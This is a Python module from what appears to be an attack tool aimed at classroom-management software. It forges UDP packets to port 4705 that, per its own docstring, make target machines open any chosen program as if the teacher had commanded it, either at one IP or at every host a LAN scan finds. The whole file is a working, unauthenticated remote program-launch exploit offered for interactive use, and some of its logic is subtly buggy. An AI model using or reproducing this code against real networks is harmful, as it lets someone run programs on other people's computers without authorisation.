import socket
import ctypes
import threading
import time
from threading import Thread

from utils import UtilsManager as utils
from utils.impl.ConfigManager import config
from utils.impl.ErrorHandler import handle_exception, ValidationError

TARGET_PORT = config.get("target_port", 4705)

@handle_exception(SystemError, default_return=None, error_message="我去为什么不允许我当余志文")
def _handle_start_application():
    import signal

    utils.info("Where would you like to open it?(eg. 192.168.153.130)")
    utils.info("If you dont input any args, it will send to all ips.")
    ips = input("[IP](Default All): ")
    app = input("[Application]: ")

    # 验证输入
    if not app:
        utils.error("Application position cannot be empty")
        raise ValidationError("Application position cannot be empty")

    # 为空默认全开
    if not ips.strip():
        ips = "all"

    # 设置信号处理器以确保Ctrl+C能被正确捕获
    def signal_handler(signum, frame):
        raise KeyboardInterrupt()

    original_handler = signal.signal(signal.SIGINT, signal_handler)

    try:
        Thread = threading.Thread(target=main(ips, app), daemon=True)
        Thread.start()

        # 等待用户中断或线程结束
        try:
            while Thread.is_alive():
                time.sleep(0.1)  # 减少睡眠时间以便更快响应Ctrl+C
        except KeyboardInterrupt:
            utils.info("\nStopping message sending...")
            # module3_main 会自动处理 KeyboardInterrupt
            Thread.join(timeout=2)  # 等待线程结束，最多2秒
            if Thread.is_alive():
                utils.warn("Message sending did not stop gracefully")
            else:
                utils.info("Message sending stopped!")
            # 不重新抛出KeyboardInterrupt，让用户返回主菜单
    except KeyboardInterrupt:
        # 捕获KeyboardInterrupt，确保能退出到主菜单
        utils.info("\nOperation cancelled by user.")
    except Exception as e:
        utils.error(f"Failed to start message sending thread: {e}")
        raise SystemError(f"Failed to start message sending thread: {e}")
    finally:
        # 恢复原始信号处理器
        signal.signal(signal.SIGINT, original_handler)

def main(ips, app):
    try:
        # 处理用户输入的"all"或空字符串，都表示发送给所有IP
        if ips == "" or ips.lower() == "all":
            ip_list = utils.ip_scanner()
            if ip_list and len(ip_list) > 0:  # 确保列表不为空且有效
                for i in ip_list:
                    # 检查是否应该继续运行
                    # 确保IP地址格式正确
                    if i and len(i) >= 1 and i[0]:
                        ips = i[0]
                        # 验证IP地址格式
                        if _is_valid_ip(ips):
                            utils.info(f"Starting application:[{app}]...")
                            start_applicaion(ips, app)
                        else:
                            utils.warn(f"Invalid IP address format: {ips}")
                    else:
                        utils.warn(f"Invalid IP format: {i}")
                utils.info("Finished.")
            else:
                utils.warn("No active hosts found. Message not sent.")
        else:
            # 验证IP地址格式
            if _is_valid_ip(ips):
                utils.info(f"Stating application:[{app}]...")
                start_applicaion(ips, app)
            else:
                utils.error(f"Invalid IP address format: {ips}")
                raise ValidationError(f"Invalid IP address format: {ips}")
    except KeyboardInterrupt:
        utils.info("Message sending interrupted by user.")
    except ValidationError:
        # 重新抛出ValidationError，让上层处理
        raise
    except Exception as e:
        utils.error(f"Error in main: {e}")
        import traceback
        traceback.print_exc()

def start_applicaion(target_ip, path, arguments="", target_port=TARGET_PORT):
    """
    以老师身份打开指定程序
    注意，path使用单斜杠
    """
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 数据包。
    header = bytearray([
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00,
        0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x2b, 0xca, 0x3d, 0xda, 0xe1, 0x61, 0x63, 0x4c, 0x94, 0x92,
        0xc9, 0x01, 0xd4, 0x26, 0xac, 0xe4, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0x61, 0x03,
        0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00
    ])
    max_middle_length = 906 - len(header)
    max_path_length = 512
    max_arguments_length = 334

    path_data = bytearray(path.encode('utf-16-le'))
    arguments_data = bytearray(arguments.encode('utf-16-le'))

    # 如果中间数据长度不足，用0x00填充
    if len(path_data) < max_path_length:
        padding_length = max_path_length - len(path_data)
        path_data.extend([0x00] * padding_length)
    # 如果超过最大长度，截断
    elif len(path_data) > max_path_length:
        path_data = path_data[:max_path_length]

    # 如果中间数据长度不足，用0x00填充
    if len(arguments_data) < max_arguments_length:
        padding_length = max_arguments_length - len(arguments_data)
        arguments_data.extend([0x00] * padding_length)
    # 如果超过最大长度，截断
    elif len(arguments_data) > max_arguments_length:
        arguments_data = path_data[:max_arguments_length]

    # 组合完整的数据包
    payload = header + path_data + arguments_data

    # 验证数据包长度
    if len(payload) != 906:
        utils.error(f"[-] pack lenth err: lenth{len(payload)}，should be 906")
        raise ValueError(f"pack lenth err: lenth{len(payload)}，should be 906")

    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF

    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (start_application)")
    except Exception as e:
        utils.error(f"[-] Failed to send to {target_ip}: {e}")
    finally:
        sock.close()

def _is_valid_ip(ip):
    """
    验证IP地址格式是否正确

    Args:
        ip (str): 要验证的IP地址

    Returns:
        bool: IP地址格式正确返回True，否则返回False
    """
    try:
        import socket
        import re

        # 确保IP地址不是空字符串
        if not ip or not ip.strip():
            return False

        # 使用正则表达式验证IPv4格式
        ip_pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
        match = re.match(ip_pattern, ip.strip())
        if not match:
            return False

        # 检查每个部分是否在0-255范围内
        for part in match.groups():
            num = int(part)
            if num < 0 or num > 255:
                return False

        # 使用socket.inet_aton进行最终验证
        socket.inet_aton(ip.strip())
        return True
    except socket.error:
        return False
    except ValueError:
        return False
    except Exception:
        return False